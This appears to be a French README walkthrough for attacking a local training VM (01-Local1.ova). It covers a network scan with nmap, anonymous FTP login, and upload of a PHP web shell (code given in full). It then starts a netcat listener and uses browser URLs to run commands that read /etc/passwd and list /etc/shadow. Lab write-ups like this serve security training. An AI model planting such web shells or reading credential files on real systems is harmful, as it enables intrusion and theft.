# Real Readme

# télécharger
```01-Local1.ova```

# mettez ceci 
```sha1sum 01-Local1.ova``` pour vérifier le hash

# et regardez si le résultat est
```f3422f3364fd38e8183740f8f57fa951d3f6e0bf```

# installer virtualbox si ce n'est pas encore fait
```sudo apt update && sudo apt install -y virtualbox```

# assure toi d'avoir les outils nécessaires
```sudo apt update && sudo apt install -y net-tools nmap john hydra metasploit-framework```

# double clic sur ```01-Local1.ova```

# donnez 4096MB comme RAM
au lieu de de 512

# Changez l'adapter en NAT
au lieu de Bridge

# assure toi que la machine virtuelle
soit activée

# mettez ceci
nmap -sn 192.168.1.0/24

# sélectionnez l'adresse de la VM et mettez ceci
nmap -A ```adresse```

# se connecter
se connecter et examiner les fichiers trouvés

# créer webshell.php et y mettre ceci:
```
<?php
if(isset($_GET['cmd'])) {
    echo "<pre>";
    $cmd = ($_GET['cmd']);
    system($cmd);
    echo "</pre>";
}
?>
```

# mettre ceci
ftp 192.168.1.26
login: anonymous
pwd: Entrée (le bouton)

# téléverser le fichier
```put webshell.php```

# éxécuter ceci dans un terminal
nc -lvnp 4444

# mettre ceci dans le navigateur:
- http://ADRESSE_IP_VM/files/webshell.php?cmd=cat%20/etc/passwd
- http://192.168.1.26/files/webshell.php?cmd=ls%20-l%20/etc/shadow
- http://192.168.1.26/files/webshell.php?cmd=cat%20/var/backups/apt.extended_states.1.gz